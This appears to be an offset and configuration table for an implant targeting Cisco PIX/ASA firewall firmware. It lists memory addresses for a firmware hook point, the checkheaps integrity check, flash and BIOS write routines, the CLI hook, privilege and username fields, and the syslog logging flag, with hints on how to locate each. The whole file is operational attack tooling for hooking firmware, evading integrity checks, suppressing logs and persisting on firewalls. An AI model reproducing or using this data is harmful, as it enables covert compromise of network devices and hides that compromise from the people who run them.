; --- SECTION I ---
;
0x702            // pix version
0x4e2800              // address of implant configuration
0x3c  0x003e8118      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x003e7b90      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x003e7f8c      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x20        // offset in block to next IP fragment ptr 
0x40  0x00dd2200      // address of context list
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation        0x005f774d      // address of our hook point.  Used for PBD.
JmpLocation         0x005fa51a      // address of our hook point.  Used for PBD.
CheckHeapsLoc       0x00cf6b18      // checkheaps checksum location
ChckHeapsTimer      0x00db8980      // checkheaps timer location
InterfaceAddr       0x00c89b94      // same as 0x30 above
InterfaceLeng       0x000001b8      // length of interface struct
IntSecurityOffset   0x1c      // security level field offset
IntNameOffset       0x188      // interface name field offset
IntNumOffset        0x143      // interface number field offset
IntVlanOffset       0x10      // same as 0xc above
IntIPOffset         0x20      // ip address offset in the interface struct
IntNetmaskOffset    0x24      // netmask in the iface struct
FlashClassAddr      0x00000000      // addr of flash structure (not used in 7.*)
CryptoDeviceAddr    0x00dbd538      // addr of crypto structure
ArpTableAddrPtr     0x00c7c858      // addr of first entry in ARP table
ArpTableLastPtr     0x00c7c860      // addr of last entry in ARP table
NumInterfaces       0x00000000      // addr of pointer to number of interfaces (not used in 7.*)
IfaceStruct2        0x00000000      // addr of pointer to second smaller interface struct (not used in 7.*)
IfaceStruct2Len     0x00      // length of 2nd smaller interface struct used by arp cache (not used in 7.*)
BiosClassAddr       0x00dca678      // addr of the bios class structure
BiosWriteAddr1      0x00360e94      // addr of the bios write function for one specific bios
BiosWriteAddr2      0x00363504      // addr of the bios write function for one specific bios
BiosWriteAddr3      0x00363c18      // addr of the bios write function for one specific bios
BiosWriteAddr4      0x00364434      // addr of the bios write function for one specific bios
BiosWriteAddr5      0x00000000      // addr of the bios write function for one specific bios
BiosWriteOffset     0x00000020      // offset into the bios structure where write addr is located
FlashMkdirAddress   0x003e8704      // ifs_mkdir; make flash directory routine -- IFS: Mkdir
ASAFlashRmdirAddress   0x006c6aac   // ifs_rmdir; remove flash directory routine for the asa
PIXFlashRmdirAddress   0x0035c804      // ifs_rmdir; remove flash directory routine for the pix
ASAFlashRmfileAddress  0x006c6a54      // ifs_rmfile; remove flash file routine for the asa
PIXFlashRmfileAddress  0x0035c694      // ifs_rmfile; remove flash file routine for the pix
FlashDirlistAddress 0x003e8284      // ifs_get_dir_entry; get the next file name from a directory listing
FlashGetSizeAddress 0x003e787c      // ifs_get_size; get the size of the provided open file
FlashChmodAddress   0x003e83a8      // ifs_chmod; change the permissions on a file
FlashMoveFileAddress 0x003e84b0     // ifs_rename; move a file
FlashGetFileInfoAddress 0x003e890c  // ifs_get_file_info; returns a structure that contains information about a file, including its size
FlashGetSpaceAddress 0x003e9b74     // ifs_get_space_info; returns used and free space in flash
FlashFileInfoSizeOffset 0x00000018  // The offset to the file size in the structure returned by ifs_get_file_info
GetPlatformStringAddr 0x00b7e048  // The address of a function that returns the platform string 
ASARestatFlashFlagAddr 0x00ddfdc0 // The address of the flag that tells the OS on the ASA to re-stat the files in flash (causes used space to be updated)
AnnounceFunc        0x00110268      // addr of the device announce function
DevIoctlOffset      0x00000070      // offset to the ioctl function in a device structure
CIStartFunc         0x0012be58      // addr of the command interface start function -- telnet function
CommandListAddr     0x00ca7a08      // addr of the command list -- first parameter of ci
DeviceListPtrAddr   0x00d0de88      // pointer to the first entry in the device table -- find in announce
DeviceNextPtrOffset 0x50            // offset into the device table entry which has pointer to next entry -- find in announce
StrcmpFuncAddr      0x00b8e930      // address of strcmp -- search for 'strcmp'
SyslogFlagPtrAddr   0x00e7f450      // pointer to the logging flag. -- search for 'Syslog logging:'
PGDGETValue         0x85b00002      // The value used for PGD_GET when calling the pager ioctl
PGDPUSHValue        0x85b00003      // The value used for PGD_PUSH when calling the pager ioctl
PGDSETValue         0x85b00000      // The value used for PGD_SET when calling the pager ioctl
StdChOffset         0x64            // Offset into a thread struct containing the stdch pointer
StdErrOffset        0x68            // Offset into a thread struct containing the stderr pointer
PrivFlagOffset      0x0c            // offset into an environment struct containing the privilege level indicator
UnameOffset         0x14            // offset into an environment struct containing the username 
EnvPtrOffset        0x70            // offset into a thread struct containing the pointer to the environment struct  
SyslogOffset        0x00000900      // offset into the syslog structure where the logging level is stored
Open                0x00110318      // open
CLIHookAddress       0x0012c344      // Address of hook into the command interface
WatchDogTimeout     0x00bd59bc      // Address where the thread timeout value is stored 
UpTimeCounter       0x00db9258      // Address of the up time counter
;
; --- END OF SECTION II ---
;
:EOS:
;
